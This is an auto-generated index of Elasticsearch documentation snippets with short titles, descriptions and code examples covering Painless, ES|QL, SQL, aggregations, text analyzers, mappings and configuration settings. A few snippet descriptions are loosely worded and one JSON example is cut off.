https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_17\n\nLANGUAGE: painless\nCODE:\n```\nMap m = new HashMap();\ndef d = new ArrayList();\ndef e = new HashMap(m);\n```\n\n----------------------------------------\n\nTITLE: Sample Log Line Format\nDESCRIPTION: Example of a log line that matches the DISSECT pattern format\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-process-data-with-dissect-grok.md#2025-04-21_snippet_1\n\nLANGUAGE: txt\nCODE:\n```\n1.2.3.4 [2023-01-23T12:15:00.000Z] Connected\n```\n\n----------------------------------------\n\nTITLE: Configuring Percentage Score\nDESCRIPTION: Example of implementing percentage calculation as a significance measure with recommendations for minimum document counts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significantterms-aggregation.md#2025-04-21_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\n\"percentage\": {\n}\n```\n\n----------------------------------------\n\nTITLE: Using Unary Positive Operator with 'def' Type in Painless\nDESCRIPTION: This example shows how the unary positive operator '+' works with the 'def' type in Painless, demonstrating implicit casting and type handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_9\n\nLANGUAGE: painless\nCODE:\n```\ndef z = +1;\nint i = +z;\n```\n\n----------------------------------------\n\nTITLE: Multiple Synonym Mapping Merging\nDESCRIPTION: Shows how multiple synonym mapping entries are combined and interpreted during token processing\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/src/test/cluster/config/analysis/synonym.txt#2025-04-21_snippet_3\n\nLANGUAGE: text\nCODE:\n```\nfoo => foo bar\nfoo => baz\n# is equivalent to\nfoo => foo bar, baz\n```\n\n----------------------------------------\n\nTITLE: Installing Elasticsearch GCE Discovery Plugin\nDESCRIPTION: Uses the Elasticsearch plugin manager to install the GCE discovery plugin. This command should be run on the Elasticsearch instance after Elasticsearch is installed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-long.md#2025-04-21_snippet_6\n\nLANGUAGE: sh\nCODE:\n```\n# Use Plugin Manager to install it\nsudo bin/elasticsearch-plugin install discovery-gce\n```\n\n----------------------------------------\n\nTITLE: Including Description for CATEGORIZE Function in Markdown\nDESCRIPTION: Markdown code to include the description of the CATEGORIZE function from an external file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/categorize.md#2025-04-21_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../description/categorize.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Handling Missing Values in Multi Terms Aggregation\nDESCRIPTION: Example showing how to use the missing parameter to handle documents where a field value is missing by providing a default value to use in the aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-multi-terms-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /products/_search\n{\n  \"aggs\": {\n    \"genres_and_products\": {\n      \"multi_terms\": {\n        \"terms\": [\n          {\n            \"field\": \"genre\"\n          },\n          {\n            \"field\": \"product\",\n            \"missing\": \"Product Z\"\n          }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Case-Sensitive Equality in Elasticsearch EQL\nDESCRIPTION: Shows how the equality operator is case-sensitive in Elasticsearch EQL, unlike in Endgame EQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_28\n\nLANGUAGE: eql\nCODE:\n```\nprocess_name == \"cmd.exe\"\n```\n\n----------------------------------------\n\nTITLE: Illustrating Invalid Reference Type Casts in Painless\nDESCRIPTION: Examples of invalid reference type casts in Painless that result in errors, demonstrating cases where implicit or explicit casts are not allowed between unrelated types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-casting.md#2025-04-21_snippet_4\n\nLANGUAGE: painless\nCODE:\n```\nList x = new ArrayList();          \nArrayList y = x;          // error \nMap m = (Map)x;           // error \n```\n\n----------------------------------------\n\nTITLE: Slicing Multi-Value Fields with Negative Indices in ESQL\nDESCRIPTION: This example shows how to use mv_slice function with negative indices to extract elements from the end of a multi-value field. It demonstrates both single element extraction and range extraction using negative indices.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_slice.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nrow a = [1, 2, 2, 3]\n| eval a1 = mv_slice(a, -2), a2 = mv_slice(a, -3, -1)\n```\n\n----------------------------------------\n\nTITLE: Creating Index with Synthetic Source\nDESCRIPTION: Example of creating an index with synthetic _source configuration for aggregate_metric_double field type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/aggregate-metric-double.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"agg_metric\": {\n        \"type\": \"aggregate_metric_double\",\n        \"metrics\": [ \"min\", \"max\", \"sum\", \"value_count\" ],\n        \"default_metric\": \"max\"\n      }\n    }\n  }\n}\n\nPUT idx/_doc/1\n{\n  \"agg_metric\": {\n    \"min\": -302.50,\n    \"max\": 702.30,\n    \"sum\": 200.0,\n    \"value_count\": 25\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Sending HTTP Request with Hostname Verifier and Socket Factory - Java\nDESCRIPTION: This snippet demonstrates how to send an HTTP request using the Nimbus SDK with the ability to specify a HostnameVerifier and SSLSocketFactory. It allows for secure connections and hostname validation ensuring that connections are made to trusted servers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/forbidden/oidc-signatures.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\ncom.nimbusds.oauth2.sdk.http.HTTPRequest#send(javax.net.ssl.HostnameVerifier, javax.net.ssl.SSLSocketFactory)\n```\n\n----------------------------------------\n\nTITLE: Setting decompound_mode to 'mixed' in Nori Tokenizer\nDESCRIPTION: Example output when decompound_mode is set to 'mixed', which decomposes compounds while keeping the original form, preserving both the full token and its components.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori-tokenizer.md#2025-04-21_snippet_2\n\nLANGUAGE: txt\nCODE:\n```\n가곡역 => 가곡역, 가곡, 역\n```\n\n----------------------------------------\n\nTITLE: Using OR Operator in Elasticsearch SQL\nDESCRIPTION: Demonstrates the OR logical operator to filter data where either condition can be true. This example selects the last_name field from the test_emp index where emp_no is less than 10003 OR equal to 10005.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-operators-logical.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSELECT last_name l FROM \"test_emp\" WHERE emp_no < 10003 OR emp_no = 10005 ORDER BY emp_no LIMIT 5;\n```\n\n----------------------------------------\n\nTITLE: Explaining RRF Scoring in Elasticsearch Response\nDESCRIPTION: Example of an Elasticsearch response with explain=true showing how RRF scores are computed for each document. The explanation includes the final score, description of computation, and details for each query's contribution.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion.md#2025-04-21_snippet_9\n\nLANGUAGE: js\nCODE:\n```\n{\n    \"hits\":\n    [\n        {\n            \"_index\": \"example-index\",\n            \"_id\": \"3\",\n            \"_score\": 0.8333334,\n            \"_explanation\":\n            {\n                \"value\": 0.8333334,                                                                                                                                               <1>\n                \"description\": \"rrf score: [0.8333334] computed for initial ranks [2, 1] with rankConstant: [1] as sum of [1 / (rank + rankConstant)] for each query\",            <2>\n                \"details\":                                                                                                                                                        <3>\n                [\n                    {\n                        \"value\": 2,                                                                                                                                               <4>\n                        \"description\": \"rrf score: [0.33333334], for rank [2] in query at index [0] computed as [1 / (2 + 1]), for matching query with score: \",\n                        \"details\":                                                                                                                                                <5>\n                        [\n                            {\n                                \"value\": 0.15876243,\n                                \"description\": \"weight(text:rrf in 0) [PerFieldSimilarity], result of:\",\n                                \"details\":\n                                [\n                                    ...\n                                ]\n                            }\n                        ]\n                    },\n                    {\n                        \"value\": 1,                                                                                                                                              <6>\n                        \"description\": \"rrf score: [0.5], for rank [1] in query at index [1] computed as [1 / (1 + 1]), for matching query with score: \",\n                        \"details\":\n                        [\n                            {\n                                \"value\": 1,\n                                \"description\": \"within top k documents\",\n                                \"details\":\n                                []\n                            }\n                        ]\n                    }\n                ]\n            }\n        }\n        ...\n    ]\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch with Significant Text Aggregation\nDESCRIPTION: Example showing how to use significant text aggregation with a sampler to analyze content field for terms related to 'Bird flu'. The query uses a sample size of 100 documents and demonstrates the aggregation's ability to find statistically significant terms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significanttext-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET news/_search\n{\n  \"query\": {\n    \"match\": { \"content\": \"Bird flu\" }\n  },\n  \"aggregations\": {\n    \"my_sample\": {\n      \"sampler\": {\n        \"shard_size\": 100\n      },\n      \"aggregations\": {\n        \"keywords\": {\n          \"significant_text\": { \"field\": \"content\" }\n        }\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\": 9,\n  \"timed_out\": false,\n  \"_shards\": ...,\n  \"hits\": ...,\n    \"aggregations\" : {\n        \"my_sample\": {\n            \"doc_count\": 100,\n            \"keywords\" : {\n                \"doc_count\": 100,\n                \"buckets\" : [\n                    {\n                        \"key\": \"h5n1\",\n                        \"doc_count\": 4,\n                        \"score\": 4.71235374214817,\n                        \"bg_count\": 5\n                    }\n                    ...\n                ]\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering Rare Terms with Regular Expressions in Elasticsearch\nDESCRIPTION: Demonstrates how to filter rare terms aggregation results using regex patterns. The example shows including terms starting with 'swi' while excluding those starting with 'electro'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-rare-terms-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"genres\": {\n      \"rare_terms\": {\n        \"field\": \"genre\",\n        \"include\": \"swi*\",\n        \"exclude\": \"electro*\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Geo-Distance in Elasticsearch\nDESCRIPTION: This snippet shows an Elasticsearch query for finding points within a certain distance using the geo_distance parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_14\n\nLANGUAGE: JSON\nCODE:\n```\n{\"geo_distance\":{\"point\":[10.0,20.0],\"distance\":25.0,\"distance_type\":\"arc\",\"validation_method\":\"STRICT\n```\n\n----------------------------------------\n\nTITLE: LIKE Operator with Escape Character in Elasticsearch SQL\nDESCRIPTION: Shows how to use an escape character with the LIKE operator to match wildcard characters literally. The example uses '/' as the escape character to match a '%' in the string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-like-rlike-operators.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSELECT name, author FROM library WHERE name LIKE 'Dune/%' ESCAPE '/';\n```\n\n----------------------------------------\n\nTITLE: Enabling TLS Diagnostic Messages in Elasticsearch YAML\nDESCRIPTION: Controls whether to output diagnostic messages for SSL/TLS trust failures. When set to true, messages are logged for rejected SSL connections due to trust establishment failures.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_21\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.ssl.diagnose.trust: true\n```\n\n----------------------------------------\n\nTITLE: Using UCASE Function in Elasticsearch SQL\nDESCRIPTION: Converts all lowercase characters in a string to uppercase. Takes a single string parameter and returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_21\n\nLANGUAGE: sql\nCODE:\n```\nUCASE(string_exp) <1>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT UCASE('Elastic');\n\nUCASE('Elastic')\n----------------\nELASTIC\n```\n\n----------------------------------------\n\nTITLE: Configuring and Testing a smartcn_stop Token Filter in Elasticsearch\nDESCRIPTION: This example demonstrates how to configure an Elasticsearch index with a custom analyzer that uses the smartcn_tokenizer and smartcn_stop filter. The filter is configured to use the predefined _smartcn_ stopwords list along with custom stopwords 'stack' and '的'. A test query is then executed to analyze Chinese text with this analyzer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-smartcn_stop.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT smartcn_example\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"smartcn_with_stop\": {\n            \"tokenizer\": \"smartcn_tokenizer\",\n            \"filter\": [\n              \"porter_stem\",\n              \"my_smartcn_stop\"\n            ]\n          }\n        },\n        \"filter\": {\n          \"my_smartcn_stop\": {\n            \"type\": \"smartcn_stop\",\n            \"stopwords\": [\n              \"_smartcn_\",\n              \"stack\",\n              \"的\"\n            ]\n          }\n        }\n      }\n    }\n  }\n}\n\nGET smartcn_example/_analyze\n{\n  \"analyzer\": \"smartcn_with_stop\",\n  \"text\": \"哈喽，我们是 Elastic   我们是 Elastic Stack（Elasticsearch、Kibana、Beats 和 Logstash）的开发公司。从股票行情到 Twitter 消息流，从 Apache 日志到 WordPress 博文，我们可以帮助人们体验搜索的强大力量，帮助他们以截然不同的方式探索和分析数据\"\n}\n```\n\n----------------------------------------\n\nTITLE: Computing Max Price with Max Aggregation in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the Max aggregation to find the maximum price across all documents in the 'sales' index. It shows the request and the expected response format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-max-aggregation.md#2025-04-22_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"max_price\": { \"max\": { \"field\": \"price\" } }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n      \"max_price\": {\n          \"value\": 200.0\n      }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Class definition for LongFieldScript in Elasticsearch Painless\nDESCRIPTION: Defines the `LongFieldScript` class for use within Painless scripts in Elasticsearch. This class serves as a type hint and provides access to field values.  The `@no_import` annotation prevents automatic importing of the class.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.long_field.txt#2025-04-21_snippet_0\n\nLANGUAGE: Painless\nCODE:\n```\nclass org.elasticsearch.script.LongFieldScript @no_import {\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with Semantic Text Field Using copy_to in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create an index with a semantic_text field as the target of a copy_to field. It uses the .elser-2-elasticsearch inference model.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/semantic-text.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT test-index\n{\n    \"mappings\": {\n        \"properties\": {\n            \"source_field\": {\n                \"type\": \"text\",\n                \"copy_to\": \"infer_field\"\n            },\n            \"infer_field\": {\n                \"type\": \"semantic_text\",\n                \"inference_id\": \".elser-2-elasticsearch\"\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Functional Interface Definitions for Elasticsearch Painless\nDESCRIPTION: Provides type definitions for Java functional interfaces in the Painless scripting language, including method signatures for different types of functions, predicates, consumers, and operators\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.function.txt#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\nclass java.util.function.BiConsumer {\n  void accept(def,def)\n  BiConsumer andThen(BiConsumer)\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing Index and Querying Geo-bounds for Geo_point Fields in Elasticsearch\nDESCRIPTION: This snippet demonstrates creating an index with a geo_point field, inserting sample data, and performing a geo-bounds aggregation. It shows how to specify the field and use the wrap_longitude parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-geobounds-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /museums\n{\n  \"mappings\": {\n    \"properties\": {\n      \"location\": {\n        \"type\": \"geo_point\"\n      }\n    }\n  }\n}\n\nPOST /museums/_bulk?refresh\n{\"index\":{\"_id\":1}}\n{\"location\": \"POINT (4.912350 52.374081)\", \"name\": \"NEMO Science Museum\"}\n{\"index\":{\"_id\":2}}\n{\"location\": \"POINT (4.901618 52.369219)\", \"name\": \"Museum Het Rembrandthuis\"}\n{\"index\":{\"_id\":3}}\n{\"location\": \"POINT (4.914722 52.371667)\", \"name\": \"Nederlands Scheepvaartmuseum\"}\n{\"index\":{\"_id\":4}}\n{\"location\": \"POINT (4.405200 51.222900)\", \"name\": \"Letterenhuis\"}\n{\"index\":{\"_id\":5}}\n{\"location\": \"POINT (2.336389 48.861111)\", \"name\": \"Musée du Louvre\"}\n{\"index\":{\"_id\":6}}\n{\"location\": \"POINT (2.327000 48.860000)\", \"name\": \"Musée d'Orsay\"}\n\nPOST /museums/_search?size=0\n{\n  \"query\": {\n    \"match\": { \"name\": \"musée\" }\n  },\n  \"aggs\": {\n    \"viewport\": {\n      \"geo_bounds\": {\n        \"field\": \"location\",    <1>\n        \"wrap_longitude\": true  <2>\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with Synthetic Source for Version Fields\nDESCRIPTION: This example shows how to create an index with synthetic '_source' enabled and a 'version' field. It demonstrates the index settings for enabling synthetic source and the mapping for a 'version' field named 'versions'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/version.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"versions\": { \"type\": \"version\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Portuguese Stop Words\nDESCRIPTION: Specifies Portuguese stop words for Elasticsearch analysis, with links to the associated Lucene file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_31\n\nLANGUAGE: markdown\nCODE:\n```\n`_portuguese_`\n:   [Portuguese stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/snowball/portuguese_stop.txt)\n```\n\n----------------------------------------\n\nTITLE: Parsing Date String to Date Object in ESQL\nDESCRIPTION: This snippet demonstrates how to use the DATE_PARSE function in ESQL to convert a date string into a date object. It takes a date string in the format 'yyyy-MM-dd' and parses it into a date type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/date_parse.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW date_string = \"2022-05-06\"\n| EVAL date = DATE_PARSE(\"yyyy-MM-dd\", date_string)\n```\n\n----------------------------------------\n\nTITLE: Including MV_SLICE Function Types in Markdown\nDESCRIPTION: This snippet includes the markdown file containing the supported types for the MV_SLICE function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/mv_slice.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../types/mv_slice.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Currency Management in Java\nDESCRIPTION: This snippet defines the Currency class which provides handling of currency information. It includes methods for obtaining currency codes, display names, default fractions, and the available currencies in the system.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_11\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.Currency {\n  Set getAvailableCurrencies()\n  String getCurrencyCode()\n  int getDefaultFractionDigits()\n  String getDisplayName()\n  String getDisplayName(Locale)\n  Currency getInstance(String)\n  int getNumericCode()\n  String getSymbol()\n  String getSymbol(Locale)\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring YAML for Zoom Connector with Docker\nDESCRIPTION: Sample YAML configuration for deploying the Zoom connector with Docker, including Elasticsearch connection details and connector specifications.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-zoom.md#2025-04-22_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\n# When connecting to your cloud deployment you should edit the host value\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: zoom\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead\n```\n\n----------------------------------------\n\nTITLE: SHOW TABLES with Wildcard Pattern Matching\nDESCRIPTION: Shows usage of multiple character wildcard pattern matching with LIKE clause.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-show-tables.md#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nSHOW TABLES LIKE 'emp%';\n```\n\n----------------------------------------\n\nTITLE: Including SUBSTRING Function Examples in Markdown\nDESCRIPTION: This snippet uses Markdown syntax to include the examples section for the SUBSTRING function from an external file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/substring.md#2025-04-21_snippet_4\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../examples/substring.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Example Warning Log Message\nDESCRIPTION: This warning message indicates that the `extraction_service.host` field is missing from the configuration file. The suggested fix is to check the configuration and ensure the field is present and formatted correctly.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-content-extraction.md#2025-04-21_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\nExtraction service is not configured, skipping its preflight check.\n```\n\n----------------------------------------\n\nTITLE: Configuring SMTP Password in Elasticsearch YAML\nDESCRIPTION: Sets the password for the specified SMTP user. This is a secure, reloadable setting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_13\n\nLANGUAGE: yaml\nCODE:\n```\nsmtp.secure_password\n```\n\n----------------------------------------\n\nTITLE: ESQL String Conversion Documentation Header\nDESCRIPTION: Comment header indicating this is an auto-generated test case file for string conversion functionality, with a warning not to edit directly.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/to_string.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Defining Armenian Stop Words\nDESCRIPTION: Defines the Armenian stop words for use in Elasticsearch text analysis. It includes a link to the related stop words file in Lucene.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_5\n\nLANGUAGE: markdown\nCODE:\n```\n`_armenian_`\n:   [Armenian stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/hy/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Setting Up JitPack Repository in Gradle\nDESCRIPTION: Configures JitPack repository for resolving GitHub-based dependencies and shows dependency declaration format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/BUILDING.md#2025-04-21_snippet_9\n\nLANGUAGE: gradle\nCODE:\n```\nallprojects {\n  repositories {\n     maven { url \"https://jitpack.io\" }\n  }\n}\n```\n\nLANGUAGE: gradle\nCODE:\n```\ndependencies {\n  implementation 'com.github.User:Repo:Tag'\n}\n```\n\n----------------------------------------\n\nTITLE: Including SUBSTRING Function Types in Markdown\nDESCRIPTION: This snippet uses Markdown syntax to include the types section for the SUBSTRING function from an external file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/substring.md#2025-04-21_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../types/substring.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Documentation Header Comment\nDESCRIPTION: Generated comment indicating the automated nature of the documentation and linking to additional resources\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/cosh.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Implementing Arabic Analyzer as Custom Analyzer in Elasticsearch\nDESCRIPTION: Creates a custom analyzer that replicates the functionality of the built-in Arabic analyzer, demonstrating how to configure stopwords, keyword markers for stem exclusion, and Arabic-specific stemming and normalization filters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /arabic_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"arabic_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_arabic_\" \n        },\n        \"arabic_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"مثال\"] \n        },\n        \"arabic_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"arabic\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_arabic\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"decimal_digit\",\n            \"arabic_stop\",\n            \"arabic_normalization\",\n            \"arabic_keywords\",\n            \"arabic_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Subquery with Field Aliasing\nDESCRIPTION: SELECT operations using field aliases in subqueries\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_subqueries_tests.txt#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSELECT i FROM\n    (SELECT int AS i FROM test);\n```\n\n----------------------------------------\n\nTITLE: Numeric Compound Assignment Examples\nDESCRIPTION: Demonstrates compound assignments with various numeric operators including multiplication, division, remainder, addition, subtraction, and bitwise operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-general.md#2025-04-21_snippet_6\n\nLANGUAGE: painless\nCODE:\n```\nint i = 10;\ni *= 2;\ni /= 5;\ni %= 3;\ni += 5;\ni -= 5;\ni <<= 2;\ni >>= 1;\ni >>>= 1;\ni &= 15;\ni ^= 12;\ni |= 2;\n```\n\n----------------------------------------\n\nTITLE: Remainder with 'def' Type in Painless\nDESCRIPTION: Demonstrates using the remainder operator ('%') with the 'def' type in Painless. The 'def' type dynamically infers the type, affecting the result of the remainder operation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_19\n\nLANGUAGE: painless\nCODE:\n```\ndef x = 5%4; <1>\ndef y = x%2; <2>\n```\n\n----------------------------------------\n\nTITLE: Documenting 'angle' Parameter for ESQL Function in Markdown\nDESCRIPTION: This snippet defines the 'angle' parameter for an ESQL function. It specifies that the angle should be provided in radians and explains the behavior when a null value is passed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/sin.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n`angle`\n:   An angle, in radians. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Configuring Java Keystore for Elasticsearch Monitoring Exporters\nDESCRIPTION: These YAML configuration settings are used to set up Java keystore (JKS) files for SSL in Elasticsearch monitoring exporters. They include paths, passwords, and other related options for both keystores and truststores.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/monitoring-settings.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.monitoring.exporters.$NAME.ssl.keystore.path: \nxpack.monitoring.exporters.$NAME.ssl.keystore.password: \nxpack.monitoring.exporters.$NAME.ssl.keystore.secure_password: \nxpack.monitoring.exporters.$NAME.ssl.keystore.key_password: \nxpack.monitoring.exporters.$NAME.ssl.keystore.secure_key_password: 